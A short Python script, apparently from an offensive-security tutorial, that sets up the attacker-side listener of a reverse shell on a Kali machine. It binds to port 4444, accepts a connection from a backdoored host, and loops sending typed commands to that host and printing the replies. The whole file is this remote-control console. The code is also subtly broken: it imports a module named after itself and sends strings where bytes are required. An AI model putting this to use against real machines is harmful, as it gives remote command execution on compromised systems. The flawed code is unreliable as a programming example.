import socket
#Now we are creating our listener.
#this is on the Linux.
#This file will be used to listen to incoming connections.
import listener

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Re-using sockets. Re-establis connection.

listener.bind(("<enterIP of your Kali machine>", 4444)) #Bind socket to our local machine.
listener.listen(0)
print("***** .Waiting for a connection. ******")
#retrun 2 objects.
connection, address = listener.accept() #Want to accect connection.
print(f"***** We have a connection from {str(address)}*****")

while True:
    command = input(">>")
    connection.send(command)
    result = connection.recv(1024)
    print(result)
